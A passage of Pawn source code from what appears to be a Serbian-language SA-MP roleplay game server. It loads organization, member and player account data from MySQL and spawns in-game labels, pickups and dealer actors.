			org_info[ OrgID ][ oZSkin2 ] = cache_get_field_content_int( i, "female_skin_2" );
			org_info[ OrgID ][ oZSkin3 ] = cache_get_field_content_int( i, "female_skin_3" );
			org_info[ OrgID ][ oZSkin4 ] = cache_get_field_content_int( i, "female_skin_4" );
			org_info[ OrgID ][ oZSkin5 ] = cache_get_field_content_int( i, "female_skin_5" );
			org_info[ OrgID ][ oZSkin6 ] = cache_get_field_content_int( i, "female_skin_6" );

            cache_get_field_content( i, "rank_1", org_info[ OrgID ][ oRank1 ], mSQL, ORG_RANK );
            cache_get_field_content( i, "rank_2", org_info[ OrgID ][ oRank2 ], mSQL, ORG_RANK );
            cache_get_field_content( i, "rank_3", org_info[ OrgID ][ oRank3 ], mSQL, ORG_RANK );
            cache_get_field_content( i, "rank_4", org_info[ OrgID ][ oRank4 ], mSQL, ORG_RANK );
            cache_get_field_content( i, "rank_5", org_info[ OrgID ][ oRank5 ], mSQL, ORG_RANK );
            cache_get_field_content( i, "rank_6", org_info[ OrgID ][ oRank6 ], mSQL, ORG_RANK );

			org_info[ OrgID ][ oPozExtX ] = cache_get_field_content_float( i, "enter_pos_x");
			org_info[ OrgID ][ oPozExtY ] = cache_get_field_content_float( i, "enter_pos_y");
			org_info[ OrgID ][ oPozExtZ ] = cache_get_field_content_float( i, "enter_pos_z");

			org_info[ OrgID ][ oPozIntX ] = cache_get_field_content_float( i, "exit_pos_x");
			org_info[ OrgID ][ oPozIntY ] = cache_get_field_content_float( i, "exit_pos_y");
			org_info[ OrgID ][ oPozIntZ ] = cache_get_field_content_float( i, "exit_pos_z");

		    org_info[ OrgID ][ oInt ] = cache_get_field_content_int( i, "interior" );
			org_info[ OrgID ][ oVw ] = cache_get_field_content_int( i, "virtualw" );

			org_info[ OrgID ][ oSpawnPoint ][ 0 ] = cache_get_field_content_float( i, "spawn_point_x");
			org_info[ OrgID ][ oSpawnPoint ][ 1 ] = cache_get_field_content_float( i, "spawn_point_y");
			org_info[ OrgID ][ oSpawnPoint ][ 2 ] = cache_get_field_content_float( i, "spawn_point_z");

			org_info[ OrgID ][ oDiler ][ 0 ] = cache_get_field_content_float( i, "oDilerX");
			org_info[ OrgID ][ oDiler ][ 1 ] = cache_get_field_content_float( i, "oDilerY");
			org_info[ OrgID ][ oDiler ][ 2 ] = cache_get_field_content_float( i, "oDilerZ");
			org_info[ OrgID ][ oDiler ][ 3 ] = cache_get_field_content_float( i, "oDilerA");
			org_info[ OrgID ][ oDilerCena ] = cache_get_field_content_int( i, "oDilerCena" );

			org_info[ OrgID ][ oDutyPoint ][ 0 ] = cache_get_field_content_float( i, "duty_point_pos_x");
			org_info[ OrgID ][ oDutyPoint ][ 1 ] = cache_get_field_content_float( i, "duty_point_pos_y");
			org_info[ OrgID ][ oDutyPoint ][ 2 ] = cache_get_field_content_float( i, "duty_point_pos_z");
			org_info[ OrgID ][ oDutyInt ] = cache_get_field_content_int( i, "duty_point_int" );
			org_info[ OrgID ][ oDutyVW ] = cache_get_field_content_int( i, "duty_point_vw" );

			org_info[ OrgID ][ oEquipPoint ][ 0 ] = cache_get_field_content_float( i, "equip_point_pos_x");
			org_info[ OrgID ][ oEquipPoint ][ 1 ] = cache_get_field_content_float( i, "equip_point_pos_y");
			org_info[ OrgID ][ oEquipPoint ][ 2 ] = cache_get_field_content_float( i, "equip_point_pos_z");
			org_info[ OrgID ][ oEquipInt ] = cache_get_field_content_int( i, "equip_point_int" );
			org_info[ OrgID ][ oEquipVW ] = cache_get_field_content_int( i, "equip_point_vw" );

		    org_info[ OrgID ][ oSavez ] = cache_get_field_content_int( i, "savez" );

			org_info[ OrgID ][ oSafePos ][ 0 ] = cache_get_field_content_float( i, "safe_pos_x");
			org_info[ OrgID ][ oSafePos ][ 1 ] = cache_get_field_content_float( i, "safe_pos_y");
			org_info[ OrgID ][ oSafePos ][ 2 ] = cache_get_field_content_float( i, "safe_pos_z");
			org_info[ OrgID ][ oSafeMoney ] = cache_get_field_content_int( i, "safe_money" );
			org_info[ OrgID ][ oSafeDrugAmmount ] = cache_get_field_content_int( i, "safe_drug_amount" );
			org_info[ OrgID ][ oSafeMats ] = cache_get_field_content_int( i, "safe_mats" );

			org_info[ OrgID ][ oPortX ] = cache_get_field_content_float( i, "oPortX");
			org_info[ OrgID ][ oPortY ] = cache_get_field_content_float( i, "oPortY");
			org_info[ OrgID ][ oPortZ ] = cache_get_field_content_float( i, "oPortZ");
			org_info[ OrgID ][ oPortA ] = cache_get_field_content_float( i, "oPortA");

			new sql_biznis = cache_get_field_content_int( i, "ent_bussines" );
            org_info[ OrgID ][ oEntFromBussines ] = -1;
            org_info[ OrgID ][ oBussinesID ] = -1;

            if( sql_biznis != 0 )
			{
				foreach(new z : iter_Bizz)
				{
    				if( sql_biznis == BusinessInfo[ z ][ b_ID ] && BusinessInfo[ z ][ b_ID ] > 0 )
					{
						org_info[ OrgID ][ oEntFromBussines ] = z;
						org_info[ OrgID ][ oBussinesID ] = z;

						BusinessInfo[ z ][ bOwnerOrg ] = OrgID;
						Bussines_Refresh( z );
						break;
					}
				}
			}
			else
			{
				sql_biznis = 0;
				sql_biznis = cache_get_field_content_int( i, "owned_business" );
				if( sql_biznis != 0 )
				{
				    foreach(new z : iter_Bizz)
					{
						if( sql_biznis == BusinessInfo[ z ][ b_ID ] && BusinessInfo[ z ][ b_ID ] > 0 )
						{
							org_info[ OrgID ][ oBussinesID ] = z;

							BusinessInfo[ z ][ bOwnerOrg ] = OrgID;
							Bussines_Refresh( z );
							break;
						}
					}
				}
			}

			org_info[ OrgID ][ oEntInt ] = -1;
			org_info[ OrgID ][ oEntVw ] = -1;

			if( org_info[ OrgID ][ oEntFromBussines ] != -1 ) 
			{
			    new biznisid = org_info[ OrgID ][ oEntFromBussines ];
			    org_info[ OrgID ][ oEntInt ] = BusinessInfo[ biznisid ][ bInInt ];
			    org_info[ OrgID ][ oEntVw ] = BusinessInfo[ biznisid ][ bInVW ];
			}

            new string[ 200 ];
            format( string, sizeof( string ),
												"Organizacija - ({FFFFFF}%d{FF6200})\n\
												{FFFFFF}%s\n\n\
												{FF6200}Da udjete koristite tipku {FFFFFF}\"ENTER\"", OrgID, org_info[ OrgID ][ oName ] );

            org_info[OrgID][o3D] = CreateDynamic3DTextLabel( string, 0xFF6200FF, org_info[ OrgID ][ oPozExtX ], org_info[ OrgID ][ oPozExtY ], org_info[ OrgID ][ oPozExtZ ], 5.0, IPI, IVI, 0, org_info[ OrgID ][ oEntVw ], org_info[ OrgID ][ oEntInt ], -1, 10.0, .priority = 30);
			org_info[OrgID][oPickup] = CreateDynamicPickup( 1314, 1, org_info[ OrgID ][ oPozExtX ], org_info[ OrgID ][ oPozExtY ], org_info[ OrgID ][ oPozExtZ ], org_info[ OrgID ][ oEntVw ], org_info[ OrgID ][ oEntInt ], .priority = 30 );
			org_info[OrgID][oMapIcon] = CreateDynamicMapIcon(org_info[ OrgID ][ oPozExtX ], org_info[ OrgID ][ oPozExtY ], org_info[ OrgID ][ oPozExtZ ], (org_info[ OrgID ][ oTip ] == ORG_TIP_VLADINA ? 30 : 23), -1, -1, -1, -1, 750.0);

			if( org_info[ OrgID ][ oDutyPoint ][ 0 ] != 0 && org_info[ OrgID ][ oDutyPoint ][ 1 ] != 0 )
			{
		        org_info[OrgID][oDuty3D] = CreateDynamic3DTextLabel("Undercover\nDa idete undercover kucajte {FFFFFF}\"/undercover\"\n\n{FF6200}Duty\nDa idete na duznost kucajte {FFFFFF}\"/duty\"", 0xFF6200FF, org_info[ OrgID ][ oDutyPoint ][ 0 ], org_info[ OrgID ][ oDutyPoint ][ 1 ], org_info[ OrgID ][ oDutyPoint ][ 2 ], 5, IPI, IVI, 0, org_info[ OrgID ][ oDutyVW ], org_info[ OrgID ][ oDutyInt ], -1, 20.0);
				org_info[OrgID][oDutyPickup] = CreateDynamicPickup( 1239, 1, org_info[ OrgID ][ oDutyPoint ][ 0 ], org_info[ OrgID ][ oDutyPoint ][ 1 ], org_info[ OrgID ][ oDutyPoint ][ 2 ], org_info[ OrgID ][ oDutyVW ], org_info[ OrgID ][ oDutyInt ], -1, 20.0 );
			}

			if( org_info[ OrgID ][ oDiler ][ 0 ] != 0 && org_info[ OrgID ][ oDiler ][ 1 ] != 0 )
			{
		        org_info[OrgID][oDilerActor] = CreateDynamicActor( org_info[ OrgID ][ oSkin1 ], org_info[ OrgID ][ oDiler ][ 0 ], org_info[ OrgID ][ oDiler ][ 1 ], org_info[ OrgID ][ oDiler ][ 2 ], org_info[ OrgID ][ oDiler ][ 3 ], 1, 100.0, -1, -1, -1, 200.0, -1, 0);

				format(string, sizeof(string), "(DILER - [%d])\nCena: {FFFFFF}$%d\n{64BC47}Dostupno: {FFFFFF}%dg\n{64BC47}Dostupan: {FFFFFF}%s", OrgID, org_info[ OrgID ][ oDilerCena ], org_info[ OrgID ][ oSafeDrugAmmount ], ((org_info[OrgID][oDilerRadi]) ? ("Da") : ("Ne")) );
				org_info[OrgID][oDiler3D] = CreateDynamic3DTextLabel( string, 0x64BC47FF, org_info[ OrgID ][ oDiler ][ 0 ], org_info[ OrgID ][ oDiler ][ 1 ], org_info[ OrgID ][ oDiler ][ 2 ], 5, IPI, IVI, 0, -1, -1, -1, 20.0);
			}

			if( org_info[ OrgID ][ oEquipPoint ][ 0 ] != 0 && org_info[ OrgID ][ oEquipPoint ][ 1 ] != 0 )
			{
		        org_info[OrgID][oEquip3D] = CreateDynamic3DTextLabel( "Equipment\nDa uzmete opremu kucajte {FFFFFF}\"/(eq)uipment\"", 0xFF6200FF, org_info[ OrgID ][ oEquipPoint ][ 0 ], org_info[ OrgID ][ oEquipPoint ][ 1 ], org_info[ OrgID ][ oEquipPoint ][ 2 ], 5, IPI, IVI, 0, org_info[ OrgID ][ oEquipVW ], org_info[ OrgID ][ oEquipInt ], -1, 20.0);
				org_info[OrgID][oEquipPickup] = CreateDynamicPickup( 1239, 1, org_info[ OrgID ][ oEquipPoint ][ 0 ], org_info[ OrgID ][ oEquipPoint ][ 1 ], org_info[ OrgID ][ oEquipPoint ][ 2 ], org_info[ OrgID ][ oEquipVW ], org_info[ OrgID ][ oEquipInt ], -1, 20.0 );
			}

			if( org_info[ OrgID ][ oSafePos ][ 0 ] != 0 && org_info[ OrgID ][ oSafePos ][ 1 ] != 0 )
			{
			    org_info[OrgID][oSafe3D] = CreateDynamic3DTextLabel("Sef\nDa koristite sef organizacije kucajte {FFFFFF}\"/orgsef\"", 0xFF6200FF, org_info[ OrgID ][ oSafePos ][ 0 ], org_info[ OrgID ][ oSafePos ][ 1 ], org_info[ OrgID ][ oSafePos ][ 2 ], 5, IPI, IVI, 0, org_info[ OrgID ][ oVw ], org_info[ OrgID ][ oInt ], -1, 20.0);
				org_info[OrgID][oSafePickup] = CreateDynamicPickup( 1239, 1, org_info[ OrgID ][ oSafePos ][ 0 ], org_info[ OrgID ][ oSafePos ][ 1 ], org_info[ OrgID ][ oSafePos ][ 2 ], org_info[ OrgID ][ oVw ], org_info[ OrgID ][ oInt ], -1, 20.0 );
			}

			org_info[ OrgID ][ oMaxPort ] = 0;
			
			OrgCounter++;
		}

		new done = false;
		for( new orgica = 1; orgica < MAX_ORG; orgica++ )
		{
			for( new j = 0; j < 52; j++ )
			{
	        	org_members_info[ orgica ][ j ][ o_m_type ] = 0;
	      		strmid( org_members_info[ orgica ][ j ][ o_m_Name ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
	    		org_members_info[ orgica ][ j ][ o_m_sqlID ] = 0;
	    		if( j == 31 ) done = true;
			}
		}
		if( done )
		{
			mysql_tquery( mSQL, "SELECT org_members.org_id, org_members.memb_rank, org_members.memb_type, org_members.memb_sqlID, users.p_name \
														FROM org_members \
														INNER JOIN users \
														ON org_members.memb_sqlID = users.user_id", "OnOrgMembersLoad" );
		}
	}
	printf("(U) SQL: Ucitao - Organizacije(%d)", rows);

	//

 	mysql_tquery( mSQL, "SELECT * FROM `vehicles` WHERE `v_usage` != '1' ORDER BY veh_id ASC", "OnVehiclesLoad", "iii", 1001, 1001, 0 );
	return 1;
}

_:public OnOrgMembersLoad( )
{
	new rows, fields, OrgID = -1, Counter[ MAX_ORG ], sqlID = 0;
    cache_get_data( rows, fields, mSQL );

	if( rows )
	{
		for( new i = 0; i < rows; i ++ )
		{
		    sqlID = cache_get_field_content_int( i, "org_id" );

		    OrgID = -1;
		    for( new id = 1; id < MAX_ORG; id++)
			{
		        if( org_info[ id ][ oID ] == sqlID )
				{
		            OrgID = id;
		            break;
		        }
		    }

            if( OrgID != -1 )
			{
		        org_members_info[ OrgID ][ Counter[ OrgID ] ][ o_m_type ] = cache_get_field_content_int( i, "memb_type" );
		        org_members_info[ OrgID ][ Counter[ OrgID ] ][ o_m_sqlID ] = cache_get_field_content_int( i, "memb_sqlID" );
	    		cache_get_field_content( i, "p_name", org_members_info[ OrgID ][ Counter[ OrgID ] ][ o_m_Name ], mSQL, MAX_PLAYER_NAME );

	    		if( org_members_info[ OrgID ][ Counter[ OrgID ] ][ o_m_type ] == 0 ) org_info[ OrgID ][ oUbacenihClanova ]++;
	    		Counter[ OrgID ]++;
			}
		}
	}
}

_:public OnAccountLoad( playerid )
{
    Login_TDControl(playerid, false);

	PlayerInfo[ playerid ][ xID ]					= 	cache_get_field_content_int(0, "user_id");

	cache_get_field_content( 0, "password", PlayerInfo[ playerid ][ xLozinka ], mSQL, 255 );
	cache_get_field_content( 0, "email", PlayerInfo[ playerid ][ xMail ], mSQL, 50 );

	PlayerInfo[ playerid ][ xRegistrovan ]			= 	cache_get_field_content_int(0, "registered");
	PlayerInfo[ playerid ][ xPol ]					= 	cache_get_field_content_int(0, "sex");
	PlayerInfo[ playerid ][ xGodine ]				= 	cache_get_field_content_int(0, "age");
	PlayerInfo[ playerid ][ xNovac ]				= 	cache_get_field_content_int(0, "money");
	PlayerInfo[ playerid ][ xLevel ]				= 	cache_get_field_content_int(0, "level");
	PlayerInfo[ playerid ][ xRespekt ]				= 	cache_get_field_content_int(0, "exp");
	PlayerInfo[ playerid ][ xPoboljsanja ]			= 	cache_get_field_content_int(0, "upgrades");
	PlayerInfo[ playerid ][ xPayDay ]				= 	cache_get_field_content_int(0, "payday");
	PlayerInfo[ playerid ][ xCSTDMScore ]			= 	cache_get_field_content_int(0, "cstdm_score");
	PlayerInfo[ playerid ][ xAdmin ]				= 	cache_get_field_content_int(0, "admin_lvl");
	PlayerInfo[ playerid ][ xSkin ]					= 	cache_get_field_content_int(0, "skin_id");
	PlayerInfo[ playerid ][ xSpawn ]				= 	cache_get_field_content_int(0, "spawn");
	PlayerInfo[ playerid ][ xLider ]				= 	cache_get_field_content_int(0, "lider");
	PlayerInfo[ playerid ][ xClan ]					= 	cache_get_field_content_int(0, "clan");
	PlayerInfo[ playerid ][ xRank ]					= 	cache_get_field_content_int(0, "rank");

	PlayerInfo[ playerid ][ xMaterijali ]			= 	cache_get_field_content_int(0, "materials");
	PlayerInfo[ playerid ][ xBussinesSqlID ]		= 	cache_get_field_content_int(0, "bussines_id");
	PlayerInfo[ playerid ][ xPosao ]				= 	cache_get_field_content_int(0, "job_id");

	PlayerInfo[ playerid ][ xBStil ]				= 	cache_get_field_content_int(0, "fight_style");

	PlayerInfo[ playerid ][ xSHealth ]				= 	cache_get_field_content_float(0, "spawn_hp");
	PlayerInfo[ playerid ][ xBrojTelefona ]			= 	cache_get_field_content_int(0, "phone_number");
	PlayerInfo[ playerid ][ xVozacka ]				= 	cache_get_field_content_int(0, "vehicle_license");
	PlayerInfo[ playerid ][ xBrodska ]				= 	cache_get_field_content_int(0, "boat_license");
	PlayerInfo[ playerid ][ xLetelica ]				= 	cache_get_field_content_int(0, "air_license");
    PlayerInfo[ playerid ][ xGunLicense ]			= 	cache_get_field_content_int(0, "gun_license");

    PlayerInfo[ playerid ][ xToolkit ]				= 	cache_get_field_content_int(0, "toolkit");

    PlayerInfo[ playerid ][ xPropertySqlID ][ 0 ]	= 	cache_get_field_content_int(0, "property_id_1");
    PlayerInfo[ playerid ][ xPropertySqlID ][ 1 ]	= 	cache_get_field_content_int(0, "property_id_2");
    PlayerInfo[ playerid ][ xPropertySqlID ][ 2 ]	= 	cache_get_field_content_int(0, "property_id_3");
    PlayerInfo[ playerid ][ xTelefon ]				= 	cache_get_field_content_int(0, "xTelefon");
    PlayerInfo[ playerid ][ xTelefonBon ]			= 	cache_get_field_content_int(0, "phone_credit");
    PlayerInfo[ playerid ][ xSnaga ]				= 	cache_get_field_content_int(0, "strenght");
    PlayerInfo[ playerid ][ xZatvor ]				= 	cache_get_field_content_int(0, "jail_type");
    PlayerInfo[ playerid ][ xZatvorVreme ]			= 	cache_get_field_content_int(0, "jail_time");
    PlayerInfo[ playerid ][ xWanted ]				= 	cache_get_field_content_int(0, "wanted_level");
    PlayerInfo[ playerid ][ xUhapsen ]				= 	cache_get_field_content_int(0, "arrested");
    PlayerInfo[ playerid ][ xPDUhapsio ]			= 	cache_get_field_content_int(0, "xPDUhapsio");
    PlayerInfo[ playerid ][ xPDStatsTicket ]		= 	cache_get_field_content_int(0, "xPDStatsTicket");
    PlayerInfo[ playerid ][ xPDStatsTicketMoney ]	= 	cache_get_field_content_int(0, "xPDStatsTicketMoney");
    PlayerInfo[ playerid ][ xTakenWeps ]			= 	cache_get_field_content_int(0, "xTakenWeps");
    PlayerInfo[ playerid ][ xTakenDrugs ]			= 	cache_get_field_content_int(0, "xTakenDrugs");
    PlayerInfo[ playerid ][ xAKod ]					= 	cache_get_field_content_int(0, "admin_code");
    PlayerInfo[ playerid ][ xSat ]					= 	cache_get_field_content_int(0, "watch");
    PlayerInfo[ playerid ][ xBRacun ]				= 	cache_get_field_content_int(0, "xBRacun");
    PlayerInfo[ playerid ][ xPreostaloZaOtplatu ]	= 	cache_get_field_content_int(0, "credit_rest");
    PlayerInfo[ playerid ][ xIznosKredita ]			= 	cache_get_field_content_int(0, "credit_amount");
    PlayerInfo[ playerid ][ xIznosRate ]			= 	cache_get_field_content_int(0, "credit_installment");
    PlayerInfo[ playerid ][ xOnlineSati ]			= 	cache_get_field_content_int(0, "xOnlineSati");
    PlayerInfo[ playerid ][ xGamemaster ]			= 	cache_get_field_content_int(0, "helper_level");
    PlayerInfo[ playerid ][ xWarn ]					= 	cache_get_field_content_int(0, "warn");
    PlayerInfo[ playerid ][ xMute ]					= 	cache_get_field_content_int(0, "mute");
    PlayerInfo[ playerid ][ xMarker ][ 0 ]			= 	cache_get_field_content_float(0, "marker_p1");
    PlayerInfo[ playerid ][ xMarker ][ 1 ]			= 	cache_get_field_content_float(0, "marker_p2");
    PlayerInfo[ playerid ][ xMarker ][ 2 ]			= 	cache_get_field_content_float(0, "marker_p3");
    PlayerInfo[ playerid ][ xOrgUgovor ]			= 	cache_get_field_content_int(0, "org_contract");
	PlayerInfo[ playerid ][ xGpsLevel ]				= 	cache_get_field_content_int(0, "gps_level");
	PlayerInfo[ playerid ][ xSkriptaRank ]			= 	cache_get_field_content_int(0, "spec_rank");
	PlayerInfo[ playerid ][ xDrzava ]				= 	cache_get_field_content_int(0, "country");
	PlayerInfo[ playerid ][ xVIPLevel ]				= 	cache_get_field_content_int(0, "vip_level");
	PlayerInfo[playerid][xPromoter]					=	cache_get_field_content_int(0, "promoter_level");
	PlayerInfo[playerid][xYouTuber]					=	cache_get_field_content_int(0, "xYouTuber");
	PlayerInfo[ playerid ][ xHitmenCena ]			= 	cache_get_field_content_int(0, "hitman_price");
	PlayerInfo[ playerid ][ xKazneniUgovor ]		= 	cache_get_field_content_int(0, "org_punishment");
	cache_get_field_content( 0, "offpjail", 		PlayerInfo[ playerid ][ xOffPJail ], mSQL, 64 );
	cache_get_field_content( 0, "offpprison", 		PlayerInfo[ playerid ][ xOffPPrison ], mSQL, 64 );
	cache_get_field_content( 0, "offpmute", 		PlayerInfo[ playerid ][ xOffPMute ], mSQL, 64 );
	PlayerInfo[ playerid ][ xStaffMin ]				= 	cache_get_field_content_int(0, "staff_min");
	PlayerInfo[ playerid ][ xMarried ]				= 	cache_get_field_content_int(0, "married");
	cache_get_field_content( 0, "married_to", 		PlayerInfo[ playerid ][ xMarriedTo ], mSQL, 64 );
	PlayerInfo[ playerid ][ xSpecAdmin ]			= 	cache_get_field_content_int(0, "xSpecAdmin");
	PlayerInfo[ playerid ][ xBingoNumber ]			= 	cache_get_field_content_int(0, "xBingoNumber");
	PlayerInfo[ playerid ][ xBingoMoney ]			= 	cache_get_field_content_int(0, "xBingoMoney");
	PlayerInfo[ playerid ][ xSlotoviVozila ]		= 	cache_get_field_content_int(0, "vehicle_slots");
	PlayerInfo[ playerid ][ xPljackaVreme ]			= 	cache_get_field_content_int(0, "rob_time");
	PlayerInfo[ playerid ][ xLeaveJail ]			= 	cache_get_field_content_int(0, "leave_jail");
	PlayerInfo[ playerid ][ xHangarTime ]			= 	cache_get_field_content_int(0, "hangar_time");
	PlayerInfo[ playerid ][ xEvent1Mesto ]			= 	cache_get_field_content_int(0, "event_first_place");
	PlayerInfo[ playerid ][ xEvent2Mesto ]			= 	cache_get_field_content_int(0, "event_second_place");
	PlayerInfo[ playerid ][ xEvent3Mesto ]			= 	cache_get_field_content_int(0, "event_third_place");
	PlayerInfo[ playerid ][ xDMEventUbistva ]		= 	cache_get_field_content_int(0, "dm_event_kills");
	PlayerInfo[ playerid ][ xRentID ]				= 	cache_get_field_content_int(0, "rent_id");
	PlayerInfo[ playerid ][ xZlato ]				= 	cache_get_field_content_int(0, "xZlato");
	PlayerInfo[playerid][xDiamond]					=	cache_get_field_content_int(0, "xDiamond");
	PlayerInfo[ playerid ][ xRezervniKljucevi ]		= 	cache_get_field_content_int(0, "reserve_keys");
	PlayerInfo[ playerid ][ xDBO ]					= 	cache_get_field_content_int(0, "dbo");
	PlayerInfo[ playerid ][ xDBoja ]				= 	cache_get_field_content_int(0, "dbo_color");
    PlayerInfo[ playerid ][ xUPoen ]				= 	cache_get_field_content_int(0, "xUPoen");
    PlayerInfo[ playerid ][ xTiki ]					= 	cache_get_field_content_int(0, "xTiki");
	PlayerInfo[ playerid ][ xReactionPoen ]			= 	cache_get_field_content_int(0, "reaction_poen");
	PlayerInfo[ playerid ][ xVipTime ]				= 	cache_get_field_content_float(0, "vip_time");
	PlayerInfo[ playerid ][ xZauzimanjeVreme ]		= 	cache_get_field_content_int(0, "taking_time");
	PlayerInfo[ playerid ][ xPoklon ]				= 	cache_get_field_content_int(0, "gift");
	PlayerInfo[ playerid ][ xPaketic ]				= 	cache_get_field_content_int(0, "xPaketic");
	PlayerInfo[ playerid ][ xSvercer ]				= 	cache_get_field_content_int(0, "mats_smugl");
	PlayerInfo[ playerid ][ xRobVreme ]				= 	cache_get_field_content_int(0, "robp_time");
	PlayerInfo[ playerid ][ xAGMStats ]				= 	cache_get_field_content_int(0, "xAGMStats");
    PlayerInfo[ playerid ][ xBoombox ]				= 	bool:cache_get_field_content_int(0, "xBoombox");
    PlayerInfo[ playerid ][ xTorba_Pizza ]			= 	cache_get_field_content_int(0, "xTorba_Pizza");
    PlayerInfo[ playerid ][ xTorba_Sok ]			= 	cache_get_field_content_int(0, "xTorba_Sok");
    PlayerInfo[ playerid ][ xTorba_Pivo ]			= 	cache_get_field_content_int(0, "xTorba_Pivo");
    PlayerInfo[ playerid ][ xTorba_Hambi ]			= 	cache_get_field_content_int(0, "xTorba_Hambi");
    PlayerInfo[ playerid ][ xTorba_Riba ]			= 	cache_get_field_content_int(0, "xTorba_Riba");
    PlayerInfo[ playerid ][ xTorba_Laptop ]			= 	bool:cache_get_field_content_int(0, "xTorba_Laptop");
    PlayerInfo[ playerid ][ xTorba_Droga ]			= 	cache_get_field_content_int(0, "xTorba_Droga");
    PlayerInfo[ playerid ][ xTorba_Oruzje ][ 0 ]	= 	cache_get_field_content_int(0, "xTorba_Oruzje_1");
    PlayerInfo[ playerid ][ xTorba_Oruzje ][ 1 ]	= 	cache_get_field_content_int(0, "xTorba_Oruzje_2");
    PlayerInfo[ playerid ][ xTorba_Oruzje ][ 2 ]	= 	cache_get_field_content_int(0, "xTorba_Oruzje_3");
    PlayerInfo[ playerid ][ xTorba_OruzjeM ][ 0 ]	= 	cache_get_field_content_int(0, "xTorba_OruzjeM_1");
    PlayerInfo[ playerid ][ xTorba_OruzjeM ][ 1 ]	= 	cache_get_field_content_int(0, "xTorba_OruzjeM_2");
    PlayerInfo[ playerid ][ xTorba_OruzjeM ][ 2 ]	= 	cache_get_field_content_int(0, "xTorba_OruzjeM_3");
    PlayerInfo[ playerid ][ xTDColor ]              =   cache_get_field_content_int(0, "xTDColor");
    PlayerInfo[playerid][xFirework]					=	cache_get_field_content_int(0, "xFirework");
    PlayerInfo[playerid][xAktivnaIgra]				=	cache_get_field_content_int(0, "xAktivnaIgra");
    PlayerInfo[playerid][xBonPotvrda]				=	cache_get_field_content_int(0, "xBonPotvrda");
    PlayerInfo[playerid][xPaysPotvrda]              =   cache_get_field_content_int(0, "xPaysPotvrda");
    PlayerInfo[playerid][xVIPWarn]					=	cache_get_field_content_int(0, "xVIPWarn");
    PlayerInfo[playerid][xOglasWarn]				=	cache_get_field_content_int(0, "xOglasWarn");
    PlayerInfo[playerid][xTogLabel]					=	bool:cache_get_field_content_int(0, "xTogLabel");

	cache_get_field_content( 0, "gate_key", PlayerInfo[ playerid ][ xKljucKapije ], mSQL, 24 );
	cache_get_field_content( 0, "reg_date", PlayerInfo[ playerid ][ xRegDate ], mSQL, 22 );

	new sqlID = 0, OrgID = -1;

	sqlID = cache_get_field_content_int( 0, "org_id" );

	if( sqlID != 0  )
	{
		for( new id = 1; id < MAX_ORG; id++)
		{
			if( org_info[ id ][ oID ] == sqlID )
			{
				OrgID = id;
			 	break;
			}
		}

	    if( OrgID != -1 )
		{
		    PlayerInfo[ playerid ][ xRank ]	= cache_get_field_content_int(0, "memb_rank");

		    new o_type = cache_get_field_content_int( 0, "memb_type" );
		    if( o_type == 1 ) PlayerInfo[ playerid ][ xLider ] = OrgID;

		    PlayerInfo[ playerid ][ xClan ] = OrgID;
		}
    }

	if( PlayerInfo[ playerid ][ xPropertySqlID ][0] != 0 )
	{
		foreach(new i : iter_Imovina)
		{
			if( PlayerInfo[ playerid ][ xPropertySqlID ][0] == II[ i ][ iSQLID ] && II[ i ][ iSQLID ] > 0 )
			{
				PlayerInfo[ playerid ][ xProperty ][0] = i;
				break;
			}
		}
	}

	if( PlayerInfo[ playerid ][ xPropertySqlID ][1] != 0 )
	{
		foreach(new i : iter_Imovina)
		{
			if( PlayerInfo[ playerid ][ xPropertySqlID ][1] == II[ i ][ iSQLID ] && II[ i ][ iSQLID ] > 0 )
			{
				PlayerInfo[ playerid ][ xProperty ][1] = i;
				break;
			}
		}
	}

	if( PlayerInfo[ playerid ][ xPropertySqlID ][2] != 0 )
	{
		foreach(new i : iter_Imovina)
		{
			if( PlayerInfo[ playerid ][ xPropertySqlID ][2] == II[ i ][ iSQLID ] && II[ i ][ iSQLID ] > 0 )
			{
				PlayerInfo[ playerid ][ xProperty ][2] = i;
				break;
			}
		}
	}

	if( PlayerInfo[ playerid ][ xBussinesSqlID ] != 0 )
	{
		foreach(new i : iter_Bizz)
		{
			if( PlayerInfo[ playerid ][ xBussinesSqlID ] == BusinessInfo[ i ][ b_ID ] && BusinessInfo[ i ][ b_ID ] > 0 )
			{
				PlayerInfo[ playerid ][ xFirmaID ] = i;
				break;
			}
		}
	}

	if( PlayerInfo[ playerid ][ xFirmaID ] != -1 )
	{
		BusinessInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bNeaktivnost ] = 0;
		sql_bussines_update_integer( PlayerInfo[ playerid ][ xFirmaID ], "b_neaktivnost", BusinessInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bNeaktivnost ] );
		Bussines_Refresh( PlayerInfo[ playerid ][ xFirmaID ] );
	}

	if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 )
	{
		II[ PlayerInfo[ playerid ][ xProperty ][ 0 ] ][ iNeaktivnost ] = 0;
		SaveProperty( PlayerInfo[ playerid ][ xProperty ][ 0 ] );
		PropertyRefresh(PlayerInfo[ playerid ][ xProperty ][ 0 ]);
	}
	if( PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 )
	{
		II[ PlayerInfo[ playerid ][ xProperty ][ 1 ] ][ iNeaktivnost ] = 0;
		SaveProperty( PlayerInfo[ playerid ][ xProperty ][ 1 ] );
		PropertyRefresh(PlayerInfo[ playerid ][ xProperty ][ 1 ]);
	}
	if( PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 )
	{
		II[ PlayerInfo[ playerid ][ xProperty ][ 2 ] ][ iNeaktivnost ] = 0;
		SaveProperty( PlayerInfo[ playerid ][ xProperty ][ 2 ] );
		PropertyRefresh(PlayerInfo[ playerid ][ xProperty ][ 2 ]);
	}

    CancelSelectTextDraw( playerid );

    static q[ 120 ];
	mysql_format(mSQL, q, sizeof(q), "UPDATE `users` SET `last_login` = NOW() WHERE `user_id` = '%d'", PlayerInfo[playerid][xID]);
	mysql_tquery(mSQL, q);

    if( PlayerInfo[ playerid ][ xSlotoviVozila ] < MAX_VEH_SLOT )
	{
		if( PlayerInfo[ playerid ][ xLevel ] >= 5 && PlayerInfo[ playerid ][ xSlotoviVozila ] < 2 )
		{
			PlayerInfo[ playerid ][ xSlotoviVozila ]++;
			SCMF( playerid, ZUTA, "(VOZILO): Dobili ste dodatni slot vozila jer ste presli level 5. Sada imate {FFFFFF}(%d).", PlayerInfo[ playerid ][ xSlotoviVozila ] );

			sql_user_update_integer( playerid, "vehicle_slots", PlayerInfo[ playerid ][ xSlotoviVozila ] );
		}

